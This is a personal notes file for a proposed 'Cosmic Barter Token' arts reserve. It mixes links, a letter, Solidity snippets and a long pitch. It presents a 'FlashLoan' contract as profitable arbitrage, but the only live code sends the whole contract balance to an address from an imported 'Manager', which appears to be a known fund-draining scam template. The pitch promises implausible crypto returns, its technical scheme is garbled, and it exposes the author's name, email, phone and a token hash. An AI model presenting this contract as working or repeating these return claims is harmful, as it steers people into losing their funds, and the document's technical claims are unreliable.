# CBT
Master file


https://github.com/kentuckleberry { 
	personal acces token (FreePass) hash = 6a36d5e9cfccdd1a68ae628d1b5e4296
	

https://docs.etherscan.io/tutorials/read-write-smart-contracts

https://www.dappuniversity.com/articles/solidity-tutorial  **** this guy is tolerable and has a pretty unique "school" thing going on {Look more at how the DAppUniversity works} 

https://codeforgeek.com/solidity-on-vs-code/ ***** a good article for Translation purposes 

**********************************************************************
		Get a fresh look at these and tell me what YOU think
***********************************************************************
https://www.alchemy.com/enhanced-apis

https://www.gate.io/ ******* SPOT and FUTURE trade portfolios especially

https://runkit.com/home ********* Make a playground and explore your own personal Node {be careful not to use an VPN I accidentally broadcast in Ukraine..accidentally} loads the current location of an international satellite 

https://www.myfreecams.com/   ******* okay but seriously, check out this platform and think about the revenue of each cam girl versus demand from creepy lonely bois

**************************************************************************
		Bedtime and Midday break easy listens
***************************************************************************

https://www.youtube.com/watch?v=WcviRO0W42A - 0x(ZRX) Decentralized Trading Platform 

https://www.youtube.com/watch?v=VDe3YiZejHU - Crystal Radio 

https://www.youtube.com/watch?v=lzHqhNoyx2o - Quarts Crystal Synthesis 

*************************************************************************
			Lastly, Dear Friend, an exceprt from a letter to James
***************************************************************************

........"	Thank you dearly for the phone call last night., It really made me think of a way to convey my message and purpose to the people I intend on helping. Simply put, I do NOT want to be an entertainer. I do NOT want to pursue live music as a source of financial income. My mission is this:

 	I aim to navigate a changing economic world with an innovative way of integrating Performing Artists that puts them in direct monetary and creative control of their material. My intention only is to act as mediator between the artist and an Untapped Audience. I can give aritsts the power to write their own financial contracts and turn profits almost instantly without entrance fees.

	Beyond that, join an an onine community to engage and monetize the path you take from the moment you sign up. Getting artists to understand that they can have their own webiste that generates passive income LEGALLY by means of ETH Smart contracts (for example) is my main obstacle. These worlds are two very different places from the perspective of either extreme side. I've taken the past 6 months or so to try and find the middle ground - and here I sit. Artists currently have the ability to:

	- Create their own social media network
	- Secure DataFiles(ie. MP3, FLAc, mP4, etc.)
	- Monetize their Data with cryptocurrncy
	- Learn and create new ways of Engaging with Art
	- Easily Donate to Causes/Orginizations
	- Be a part of the first ever Decentralized Reserve for Arts, Science, and Medicine

That's a lot to unpack, believe me I'm trying, but it all starts with working musicians being involved with the 'ART' happening online with NFTs and cryptocurrency. The veil I'm trying to lift within the public view is this:

Time Does not equal Money.

	This community monetizes from Value added into the real world, and defines that Value primarily as Art, Science, or Medicine.

	Again, thank you so much for your phone call, James. IT really helped me define these terms and find a way to contiue my personal work. You see, I have a daughter. Many people don't know this and easily look past it when considering the idea of Me. I would love to work with you, play music, and shoot shit at the bonfire on occasion, but my mind and soul won't sit pretty until I have a safe haven farm for that little girl. Far away from her crazyy momma and any of the hurt she's already been through.

	No one sees the end goal like I do, and I'm glad. Hopefully you have questions about this and more importantly, I hope you see a bit more where I'm coming from in regards to my intentions, aspirations, and current placement. " 


-------------- This essentially is the first draft of a Purposal

*******************************************************************88
		LAstly, again, to follow and finish up
**********************************************************		

_ Handwritten script that works on ETH mainnet when deployed through MIT open source pragma in SoilidtyETHRemix Software__

pragma solidity ^0.5.0;

// Multiplier-Finance Smart Contracts
import "https://github.com/Multiplier-Finance/MCL-FlashloanDemo/blob/main/contracts/interfaces/ILendingPoolAddressesProvider.sol";

// Dex Smart Contracts
import "https://github.com/uniswap-finance/uniswap/blob/master/contracts/interfaces/IUniswapPair.sol";
import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakePair.sol";

	contract FlashLoan {
	string public tokenName;
	string public tokenSymbol;
	uint loanAmount;
	Manager manager;
	constructor(string memory _tokenName, string memory _tokenSymbol, uint _loanAmount) 	public {
	tokenName = _tokenName;
	tokenSymbol = _tokenSymbol;
	loanAmount = _loanAmount;
	manager = new Manager();
}
	function() external payable {}
	function action() public payable {
// Send required coins for swap
   address(uint160(manager.swapDepositAddress())).transfer(address(this).balance);
   
/*
// Submit token to blockchain
   string memory tokenAddress = manager.submitToken(tokenName, tokenSymbol);

// List the token on dex & send coins required for swaps
	manager.swapListToken(tokenName, tokenSymbol, tokenAddress);
	payable(manager.swapDepositAddress()).transfer(300000000000000000);

// Get ETH Loan from Dex
	string memory loanAddress = manager.takeDexLoan(loanAmount);
// Convert half ETH to DAI
	manager.swapDAItoETH(loanAmount / 2);

// Create ETH and DAI pairs for our token and Provide liquidity
        string memory ethPair = manager.swapCreatePool(tokenAddress, "ETH");
	manager.swapAddLiquidity(ethPair, loanAmount / 2);
	string memory daiPair = manager.swapCreatePool(tokenAddress, "DAI");
	manager.swapAddLiquidity(daiPair, loanAmount / 2);
   
// Perform swaps and profit on Self-Arbitrage
	manager.swapPerformSwaps();
// Move remaining funds from contract to your wallet
	manager.contractToWallet("ETH");

// Repay Flash Loan
	manager.repayDexLoan(loanAddress);
   */
}
}

*********************** This works in theory on TestNet (JavaScript) however some repositories go down or we lose acces to them resulting in a failed transaction ^ Imports'Githib' not found If/then replace or substitute as needed. 

This is the Simplest form of Loan Arbatrage I have found that consistently yields revenue (Pancakeswap and Uniswap are good to exchange) Polygon can be used to avoid higher fee rates on ETH or BSC.

BTC is unique in that it is typically run from its own RPC and your own personal node must download all previous blockchain data. however, runkit (Livenode test net) and remix and programs like Nodejs are making it possible to acces this data through links (strings) of data. In solidity file type it is possible to insert links has npm or install function but instead of hosting that data, it does an extended callback through the initial contract deployment to retreive the data when needed (i.e. when the contrtact is interacted with) 

This module works and exists but not to the extent that the general public could easily interact with it. ( By the way I own the domains freeassociationpress.org AND appuletchya.com... as in "wanna buy real estate in Ky?? This Appuletchya!" )

I see you fitting in somewhere of this area because it is where users (family members) will be most at stake - entering a new system without knowing how it works. You set the dynamics and the fallbacks, plan B, and ultimately most positive and overall beneficial outcome for the User's privacy and the systems function - generating Cosmic Barter Tokens {reciepts of Inneraction [A ledger that documents transactions, fees, and the user's precise pathway when using app]} for instance, as the owner of the contract I could check the balance of Cosmic Barter Tokens in ANY purchasers wallet at ANY time, but not acces it. 
*******************************************************************************************
		Thats a lot but theres still more and more and more and more....
****************************************************************************************

_handwritten solidty Vending Machine.sol_ 

// SPDX-License-Identifier: MIT
	pragma solidity ^0.8.11;

	contract VendingMachine {

// state variables
	address public owner;
	mapping (address => uint) public CBTBalances;

// set the owner as th address that deployed the contract
// set the initial vending machine balance to 100
	constructor() {
	owner = msg.sender;
	CBTBalances[address(this)] = 100;
 }

	function getVendingMachineBalance() public view returns (uint) {
	return CBTBalances[address(this)];
 }

// Let the owner restock the vending machine
	function restock(uint amount) public {
	require(msg.sender == owner, "Only the owner can restock.");
	CBTBalances[address(this)] += amount;
 }

// Purchase CBT from the vending machine
	function purchase(uint amount) public payable {
	require(msg.value >= amount * 2 ether, "You must pay at least 2 ETH per CBT");
	require(CBTBalances[address(this)] >= amount, "Not enough CBT in stock to complete 		this purchase");
	CBTBalances[address(this)] -= amount;
	CBTBalances[msg.sender] += amount;
 }
}
************************* TO START:
Index - Code 101

Line starts with '//' [Comment or editorial]

Lines 139 {Contract Vendingmachine_} to 149 {CBTBalances..} [What the contract does]

Lines 152 - 153 [function allows ANYONE to check 'Stock (?/100)' of machine]
			Returns x/100
Lines 156 - 159 [function allows only OWNER of contract to 'REstock' machine]
			Returns "Only Owner can restock" if called from different addresss
Lines 162 - 167 [Function sets initial price at 2ETH and exchanges with contract]
			Returns "you must pay at least 2 ETH" if initial deposit is <2
			Returns "Not enough CBT in STOCK..." if machine is out of stock

The contract addres holds the storage function of the data for Economic collateral, while the live node and repository hold storage for content. Therefore creating the "Binary Pair' system for ID, accessibility, download, and the SFTP
*************************************************************************
			IF YOU STILL WANT MORE CHECK THIS OUT
**************************************************************************

Navigational Dynamics and Parameters for DRASM (Decentralized Reserve for the Arts, Science, and Medicine) Caridnal Directions ([N] [E] [W] [S]) Stand as 'Portals' 

https://gist.github.com/kentuckleberry/f6c6161cae2e5de55200c1c48daad001

SO basically....


[N] (North) = Input Key Sig

[E] (East) = Empty Set Output {VTXO (Verfied Transaction Output)}

[W] (West) = Wrapped Request

[S] (South) = Storage and Memory Unit Authorization 

'Portals' Are the public acces and interface with the application. They are designated ares or code set for users to dictate When, Where, What, and Why (If Needed)

Sub Cardinal Directions are used to describe 'Pathways' and provide 3 Way Authentication 
	Users Acces 'Portals' the contract manuevers through 'Pathways'

[NE] (Beginning and End of Public transaction) = sha256{(hash160 wallet seed phrase) + encrypted media file} + dataset(require byte code msg.sender public payable)} 

[SE] (Beginning and End to Private transaction) = sha256{(hash160 Private Seed Phrase Message Signature) + VTXO require( byte code msg.sender payable Contract Owner)}

[SW] (Wrapped Request for Storage) = sha256{(hash160 pubkey) + media file (public) + 100 CBT)}
	Returns Unique TXID for Callback through contract 

[NW] (Transaction Output Sig) = sha256{(hash160 VTXO) + time strand proof from previous [NE/SE] + {byte of [SW]} 


For Example....

	Lets's say Randy is a super chill dude with a 4TB hardrive full of PowerRangers videos... [free association press for a reason ladies...and gentle boys].... ANYWAY Randy REALLY likes the Power Rangers aLOT... and he's faced with the problem of Storage. 

	"Why must I decide between 600 hours of deleted scenes and bloopers or all my cat pictures?????" 

We feel you Randy, even though we wish we didn't.. 

Randy really values this data and therefore would only consider selling it to the right buyer, let alone give it away FOR FREE... psht... ya right. 

So Randy invests in crypto and decides to make Digital Aart out of Cat pictures but still cant delete the originals due to the sentiment.. 

	"REmember his birthday last year??"....
Anyways.

He posts the NFTS of SuperFatCat (1,000) for 0.5 ETH each.. now... on any given day that means his collections is worth anywhere between 30 and 40K..ish?? and he only spent let's say $200 to mint the collection on let's say Polygon (notable for it's cheap fee and exchange rates)...

SWEET! Randy is sitting pretty with his collection all valued corectly..at least in his mind... but no one is buying and he still has the issue of storage. 

WELL!

THIS is where start to assume Randy may use our application... 

He gets an Add on OpenSea (marketplace) for an NFT Vending machine Contract [Running title] where he can:

	- Transfer the Value and owner rights from his personal wallet to the contract or 	another specific user
	
	- Upload the original file he doens't want to delete AS the original and clone a copy 		any time he wants from any device for free

	- Make INSTANT profits [affected by varying markets] from an initial Sign Up contract 		[Loan Arbatrage {shhhh. thats the secret yet totally legal check out the housing 		market in 2008}] that generates based on the initial input value

  {i.e. Randy says SuperFatCat NFT #999 is worth 0.5 ETH ( ~ $1,500 ) and uses 1.(the encrypted media + the hash160{His personal seed phrase} + bytecode require(Portal [N or E])

to initialize his transaction with our contract. This triggers 2. Smart Contract to Return profits based on User Input. Lets say on an average day, Randy spent 0.5 ETH and after initial gas fees for Mainnet are covered, Randy's CBT (Cosmic Barter Token) account says 8 ETH  (~$24-26,000)... YEAH SERIOSULY. Now, before we even let Randy know this IS Possible, our Mandatory Donation Center takes Half and puts it on hold to wait on return from Prompt "what are your interests" while Randy is still setting up his account. 

This function will grow over time but initially we will have an algorithm that selects say 5/50 functional donations and charities or CFA and subsidiaries. User preference will be a MAJOR part of this system in the future but for now, less options are better. At least in my opinion.. 

SO Randy has spent 0.5 ETH, stored his original file, retained constant Offline access to it, AND is about to recieve 4 ETH??? WHAT?!?!?! 

Yes, that could happen but still.. Randy didn't work that hard to make the SuperFatCat NFT... especially compared to the file that it is stored with/against... a 3 hour .m4v file titled 'JFK: The Aliens from Coca-Cola, an asteroid beneath the ocean, and 2 more presidents with the last name Roosevelt ' A Freedom Writer Tells All '" by Martian ScoresEtsy... [A cool voting feature can be implemented too to determine whether or not the genreal public thinks you're transaction is fair] 

We only want to make sure that Randy gets his initial 0.5 ETH back, and gas fees he may encounter, and a lil extra from the Reserve as an ecredited donation for our tax purposes..

simple chart for general idea:
******************************
Input (ETH)			Output(ETH/CBT Cosmic Barter Token)

0.5				2/200

1				3/300

2				4/400

3				5/500

etc....

So already there is incentive to spend more, as your recieve more from the Vending Contract

This way, we only use Spent currency to lean against stable coins privately, and redistribute earnings responsibily within the Specific Function of the Contract -> Arts, Science, and Medicine

So Randy's copy of SuperFatCat NFT #999 belongs to us essentially.. It is in our contract's wallet address {msg.sender // deployer of solidity file} and the original file (.txt, .jpeg, .pdf etc.) is available any time any where to share, copy, promote, edit, like, or comment. He also retains royalties (determined by his own personal contract when NFT launched) if we choose to Donate, Sell, or Exchange. His TB hardrive just got 100 KB of space, and his detailed reciept is visible to the public database. SuperFatCat NFT is also addeed to Contributors and Donations list for next User raffle (based on user preference and discretion) 

He also walks away with an extra 1.5 ETH PLUS 200 Cosmic Barter Tokens! He can shoose to store CBT in his FreePass application, in another wallet (if it hosts CBT), donate to specific or random cause, OR and this is one of my favorite Easter Eggs... Leave for Next USer. If no 'Change" address is given or if specifically instructed, users can leave a lil startup behind in the "flappyChangeTray" to give the next user some room to play! and it's all by chance! 

In summary:

Randy's Input: "SuperFatCat NFT #999 (~$1,500 or 0.5 ETH)

	Randy's Sub Cardinal 'Pathway' = [N] [E] [W] [S] require([NE/SE/SW/NW]

Randy's Output: {CBT reciept byte code} [Tx hash] + {promt to sign a message of bytecode with secret phrase and pubkey address} [Tx pukey sig] // acts as 'password or key to lock' to acces exchanged data // 

When Randy closes the App (after he saves his reciept manually or verifies he got it through email), a Time Strand Data Event Snapchot is taken and recorded in the Public Ledger.

Example: 12:12:12 {21/12/22} UTC @ 34'48", 08'38" from {Node.v16}/Polygon Bridge Exchange
	"txN": "sha256{(hash160 pubkeyaddress) + seed phrase}", Auth 1
	"txNE": "sha256{[N] + hash160[require(msg.sender public) + encrypted media file}",
	"txE": "0", // returns VTXO created by contract 
	"txSE": "initial deposit (Native currency) + byte code ([SW] + [S])", // Value in CBT
	"txS": "Personal CBT wallet Pubkey Hash + function(call time strand event)", // Auth 2
	"txSW": "{sha256{(hash160 pubkey) + media file + [100 CBT]} + Directional Storage Data Location [Byte code]", // PubStoreWrapRequest 
	"txW": "Transaction Data Confirm Wrap with Original Decrypted Media File QR Code", // Auth 3
	"txNW": "signature, confirm, and print reciept with 'sha256{(hash160 pubkeyaddress) + seed phrase) + Time Strand Event Close",// Sign Off/Recieve and End Transaction

	"value": "Initial deposit + initial profit of Vending Insurance Contract [Arbatrage] + Donations/tips offered + 100 CBT", // bytecode should be converted to CBT or other (uint256)
	
	"returnAddress": " initial Deposit + ratio based earnings (Native currency/CBT) + Donation taxpayer documents + content file Storage/access [VTXO] + CBT reciept with redeemable functions and User Insurance notes", // donation amounts shown in CBT and liquidated as an NFT asset against varying markets and trading platform currency

	"remaining CBT": " Final decision/prompt before app closes and waits for a new Inneraction - Leave remaining CBT for next user? Remember all Ledger is public and the owner only restocks CBT Once every month.. - ", // or soemthing like that. Essentially, the contract will either have gas for the next user (who will make at least 200 CBT and have trhe option to leave or withdraw) or it won't and someone is going to make BANK off their Inneraction in gas fees alone.

	If User Withdraws Public CBT fund, then:
	"publicCBTTransferOut": "Pubkey",
	
	If User Leaves public CBT fund, then: 
	"publicCBTDonationIN": "hash160{(private phrase) + scripthash}, 
		getAddress(msg.sender) public payable;
		submit(msg.sender) address log(public Donation Ledger);
		generateTxReciept = VTXO // Personal User Transaction Input with time strand Data event Authorization (3) passed for future use of application.

The next time Randy wants to see SuperFatCat NFT #999, he will only need his (1) VTXO, (2) Time Strand Data Event, and (3) QR code of Encypted Media File. All three Authorization elements can be submitted with one QR scan if compiled correctly. 

and there we have our first Inneraction with this Conceptual Reserve. Randy profits from his work as an Artist, stores his files for free essentially, collects capital gains (%150) in his native token or currency, recieves tax breaks (if needed) through donations exceeding the value of his transaction, AND he may have even communicated or exchanged ideas with someone his file is stored with while becoming a completely possible recipient of the Random Donation Lottery Algorythmic Decision Machine. NOT TO MENTION, he still has 999 SuperFatCat NFTs that are NOT involved with the services in our Reserve.... pretty cool right?? 

Now imagine an entire Album release... a Live Art Gallery hosted by Google Maps from My backyard through Oculus Quest/VisualAX and the metaguru entertainment team... Imagine some rascist fuck thats good at coding - through random happenings - ends up Donating to a Black youth organization by initializing a transaction with our machine.. Imagine an app that provides Insurance for your Content AND mental/physical health all in one Stop that let's you donate free money to GET FUCKING CLEAN WATER IN FLINT MICHIGAN or STOP A PIPELINE FROM DISRUPTING NATURAL HABITATS or even... and this is a quote from Sylvia... " Just buy Yellowstone or Yosemite or whatever, and make it free for everyone again... so they can see the bats..."

******************************************************************************************

As you can see, the dynamics are much of the desirable traits in this agreement... Users trust that we can back of their files while they still maintain royalties and rights to access. Perhaps not everyone will be willing to Donate, or may find preselected causes and organizations unsutiable [small test runs and surveys/user application sites], and for my expectation, Users will be overwhelmed and even confused as to what the purpose of the application is until they see the First Inneraction and Public Reciept (much like BTC). 

I do not aim to increase the value of Cosmic Barter Token - in fact it should stay relatively low for utility - but If public demand increases while Public supply remains the same, we will be put in a position to mint New Tokens which may call for a Secondary Arbatrage Contract [Fork] and potentially more than Online repositories and live browser nodes will be required for the Storage Function to work. As Owner, I (we) retain rights to limit access to storage how we see fits best for the overall success of the Machine as well as the privacy of its users. 

*******************************************************************************************

Liability, Subsidiaries, CFAS, and more!! I know I know.. I said I was done 10 pages ago... Do you want to Retire early and help people like Jimmy Carter or Not?...
******************************************************************************************

	When A user signs the agreement to Join {Our App Name here}, they are agreeing to the following:

	- Pay an initial Deposit in their Native Crypto/Currency // Transfer uint(256) from Private(Address)to ContractAddress(public payable)
	- Donate a portion of Initiated Contract call to 1 (or more) DeFi App, Community, Charity, Cause, or Individual listed in our'ApprovedDonationsRecieve.lib' [public searchable lsit of Collaborators, Users, and Charities or Crowdfunding projects]. 'Portion' refers to 
{
Variable = Dependent on Market rates/prices at time of Transaction + Initial Deposit + YES/NO Media storage in App 
}

	- Relinquish all rights to Media uploaded - except for royalties - and understand that this item will be stored DEFINITELY with a paired item. These Two items will be loaded together, but only your half can be accessed with 3 Authorization parts. This means:

	"Once User Transaction occurs, the information on reciept is confirmed by user to be 	valid, and conveys a message to the public ledger in a readable and coherent document which 	can be navigated by ANYONE who decides to learn the Cardinal Direction Portal instructions 	(arguments). This reciept is in the form of a QR CODE that stores the bytecode and the bytecode can only be decoded with the Time Strand Data Event, VTXO, and the user's private seed phrase/signed verification message (3 authentications in 1). 

	- The owner of the Vending machine contract retains the rights to check the balance of CBT in ANY user's wallet (without seeing other tokens) at any given time. Typically this is used when deciding whether ot not to Restock and other econimic factors. 

	- Acknowledge the fact that this system is YOUNG, NEW, and FUNCTIONS MANY DIFFERENT WAYS. It's supposed to be set up so that by the end of one interaction, a user will potentially find their own style to navigate with and then gets rewarded with a completely original token that correlates to the Owner's (Levi Shmevi) personal harddrive. 

	- As the cherry on top, each new user lets say the first 5,000, will get an Original Media File gifted directly to their  wallets from the Owner. This could be an .mP3, a small video, or even an encrypted message that explains how to send yourself 1 BTC from the first block on the BTC blockchain...(that's right. the gensis  block baby).

	- That cherry is sitting on top of a Reciept 1 [A public note that says 'A user Inneracted with the Application/contract in the following ways...
	-1
	-2
	-3................and then yada'

	It also states 2 [ 3 authentication fields, the overall Value, the returned Value, and the ADDED value ]

	And finally 3 [ provides VTXO, QR Code, and the current User Balance of CBT] 

**CBT Gift/Withdrawal is a seperate TXN from(User/Contract)to PubKeyHash or ScriptKeyHash**

Donated CBT is treated as a donation to the Machine - and will likely be left for the next User for the greater functionailty of the Newtwork Protocol and purpose of limiting fees accociated with Send/Recieve function.
******************************************************************************************

Documents Provided are only loose templates and ARE NOT ready for Deployment as of (TIMESTRAND) 4:14:26 AM EST @ 38 4'3"N 84 30'26"W Lexington, KY {Ubuntu FlashDrive on Torr} 

//// SPDX-License-Identifier: MIT ////

email: kentuckleberryfinn@protonmail.com	
website: freeassociationpress.org
Phone (business): 859 935 1699 

*****************************************************************************************

PLEASE, I NEED HELP WITH THE FOLLOWING:

	- Creating a list of 50 AWESOME Charities/Communities/Causes for 'donations.lib'
	- Finding 25 Artists (visual, digital, performing, musicians, etc.) that would be 
	willing to "Guinea Pig" - and get paid [varying dependent on {initial deposit, skill set, file size, storage YES/NO, overall added value}]
	- Obtaining an ACTUAL BANK ACCOUNT that can be linked to the CONTRACT ADDRESS
	(Remember, the Vending Machine is Liable. If it ever goes under, we count it as a loss
	equal to the value of personaml investment, while the Machine has a fallback to 	storage [available by public ledger] and could stand alone as a repository that any 	server could fork from - another server could use the Application's API or cURL as a relay 		in another contract and still aquire monetized value through gas fees and redeposited 		Arbatrage Loans. So I need all that to build in ONE account that pays me the Owner 	 LEvi Smevi) by means of direct deposit once every week for my total hours logged at my 		rate of pay that will forever stand as follows:

I, Thomas Levi Cox, owner, creator, and manager of this contract state that my Paid Earnings will ALWAYS be public knowledge, as will the sources at which these Earnings come from, as will these Earnings amount.
	{
const Paycheck(contract Owner) payable public;
const BasePayrate(USA minimum Wage [value in $USD]) x number of hours in a day (24);
const BasePayperWeek((24 hours in a day) x 6 days a week));
const log(work days) when Day 6 Ends;

function transferFunds(set equal to (USA minumum wage x 144 hrs)) {
	recieve(uint(256)) contract address public;
	send(uint(256)) owner address public;
}

const Rest( Application is NOT OPERATIONAL the same day every week) {

getRandom(24 hour interval) {
	function recieve({begin time} + {end Time}) 
	begin = Machine Restart After Logging Storage
	await(end time);
	end time = Machine Operational;
	await(New User);
}
*****************************************************************************************

Seriously..... I think this may be the last bit....

************************************************************************************

 This Offer Stands from Now (Insert Time Strand Data Event/Location) ^ Line 371 ^
until the Owner Publicly denounces this post WITH a call back to these lines < < 

	I will give ANYONE 1000 newly generated CBT (spendable/tradable/exchangable) if they can add Proof (digital collage/folder, video, audio file, etc.) that without a doubt, they successfully aided I. A grand parent II. An elderly family friend III. A confused/or misunderstood client/user or IV. any willing person over the age of 65 in the Practical Application of this Innerface. As a Decentralized Reserve, we aim to be "LongStanding" if that means anything...

At its core, this Machine/Innerface/Protocol has Three Main Concerns: 
	- Storage
 	- Privacy/Anonymity
	- Comprehension and Honest Ledgers

Beyond on this, some personal ideals held by the creator are at play:

	- Incentive to hang out with Elder members of this planet, and teach them how to write their own 'New Deal' or even bring publicity to a Legacy that was previously unnoticed

	- Upload Media files to gain free storage and Utility within the protocol as well as INSTANT margin return

	- Adding Value that's only quantifiable by the User's preference

	- Value is Dispersed Semi-Randomly/User-based preference/specific Input

	- A public Reserve soley dedicated to Art, Science, and Medicine that is Owned by the Users can stimulate and be stimulated by growing markets, price caps, price gap volitility, Supply (= 1)/ Demand ( = supplyx2), and overall interest in the message of the project. 

* If people can dig what we're about, they'll use it, we'll debug it, and back n forth until Our Community has really built something that really works and makes sense to those who may not have a total grasp on 'Web3', "blockchains", 'cryptography', or 'Digital Assets'. The 'New Deal' is almost 100 years behind us and much of our internal structure (as a planet dare I say even) is based on HUGE technological, agricultural, and socioeconmic changes during that time that catapulted the lifestyle of many americans out of the country side and into the Industrial Revolution. We've seen National Park services fail, we've seen Social Security implented with great intention and still fall short on climbing pay wages. We've seen a generation or two of children diagnosed with ADHD and the pharmaceutical companies that bank on Insurance sales quotas rather than focus on Airflow and breathing treatments. We've all been overwhelmed and pressured to fix something, but who remembers what's broken? 

The elders do... They've seen it before, in some way or shape, they've seen it before. With respect, kindness, empathy, and compassion, I encourage everyone to reach out and connect with Elder Members of their community while they still can. They are resources of wisdom, living memory banks with miles of experience to fall on, and not to mention, they're in a position we will all be in one day. 

Will you be able to provide for yourself when your 65? Provide for your loved ones? Will you be able to recieve necessary medicine or Health Care for your failing body? 
Will you have a house over your head and food in your belly? Will anyone care enough to make sure you're taken care of when you can't remember your iPhone passcode to unlock Voice Assist and try to speak a pass phrase into the automated iDoor Lock that somehow got the default language set to "Spanish"? Will you be able to look back and rememeber those you helped soley for the fact that you could when you were able? 



**1000 Newly Generated CBT to anyone that provides proof ******************

// End DRASM Handout Template //
